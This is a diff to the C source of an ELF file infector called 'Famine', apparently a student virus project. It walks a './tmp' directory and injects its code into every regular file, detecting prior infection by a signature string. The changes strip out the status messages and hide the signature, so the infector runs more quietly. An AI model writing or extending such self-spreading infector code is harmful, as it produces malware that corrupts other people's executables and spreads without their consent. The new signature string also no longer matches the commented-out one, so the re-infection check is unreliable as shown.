@@ -19,24 +19,18 @@ extern void end();
 void famine(void);
 
 #define JMP_OFFSET 0x6
-#define SIGNATURE_OFFSET 0xa
-#define SIGNATURE_SIZE 25
 #define JMP_SIZE 4
 
 void	__attribute__((naked)) _start(void)
 {
 	__asm__ ("call famine\n"
-			"jmp end\n"
-			"signature:\n"
-			".ascii \"Famine coded by Francis\\n\\0\"\n");
+			 "jmp end\n");
+			//"signature:\n"
+			//".ascii \"Famine coded by Francis\\n\\0\"\n");
 }
 
 
 static int	patch_new_file(t_data *data, const char *filename) {
-
-	_syscall(SYS_write, 1, filename, ft_strlen(filename));
-	char newline[] = "\n";
-	_syscall(SYS_write, 1, newline, 1);
 
 	_syscall(SYS_unlink, filename);
 
@@ -48,7 +42,6 @@ static int	patch_new_file(t_data *data, const char *filename) {
 		_syscall(SYS_close, fd);
 		return 1;
 	}
-
 
 	_syscall(SYS_close, fd);
 
@@ -82,10 +75,26 @@ static int	inject(t_data *data) {
 	return 0;
 }
 
+static int search_signature(t_data *data, const char *key) {
+    if (!data || !data->file || !key) {
+        return -1;
+    }
+
+    size_t key_len = ft_strlen(key);
+    if (key_len == 0 || key_len > data->size) {
+        return -1;
+    }
+
+    void *found = ft_memmem(data->file, data->size, key, key_len);
+    return (found != NULL) ? 1 : 0;
+}
+
 static int	already_patched(t_data data)
 {
-	char	signature[] = "Famine coded by Francis\n";
-	return (ft_memcmp(data.file + (data.elf.ehdr->e_entry + SIGNATURE_OFFSET), signature, SIGNATURE_SIZE));
+	char signature[] = "Famine (c)oded by Francis\n";
+	//char signature[] = "\x46\x61\x6d\x69\x6e\x65\x20\x63\x6f\x64\x65\x64\x20\x62\x79"
+	//	"\x20\x46\x72\x61\x6e\x63\x69\x73\x0a\x00";
+	return search_signature(&data, signature) == 1;
 }
 
 static int	infect(const char *filename)
@@ -102,12 +111,10 @@ static int	infect(const char *filename)
 
 	updade_hdr(&data);
 
-	if (!already_patched(data)) {
-		char msg[] = "already infected\n";
-		_syscall(SYS_write, 1, msg, sizeof(msg) - 1);
-		return (free_data(&data), 1);
+	if (already_patched(data) != 0) {
+		free_data(&data);
+		return 1;
 	}
-	// check if already infected
 
 	if (inject(&data) != 0) {
 		free_data(&data);
@@ -157,14 +164,12 @@ static void	open_file(char *file)
 				continue;
 			
 			if (dir->d_type == DT_REG) {
-				char new_path[PATH_MAX];
-				make_path(new_path, file, dir->d_name);
-				//_syscall(SYS_write, 1, new_path, ft_strlen(new_path));
 
-				if (infect(new_path) == 0) {
-					char msg[] = "infected\n";
-					_syscall(SYS_write, 1, msg, sizeof(msg) - 1);
-				}
+				char new_path[PATH_MAX];
+
+				make_path(new_path, file, dir->d_name);
+
+				infect(new_path);
 			}
 		}
 	}
@@ -175,7 +180,6 @@ static void	open_file(char *file)
 
 void	famine(void)
 {
-
 	char p1[] = "./tmp";
 	char *paths[] = {
 		p1,
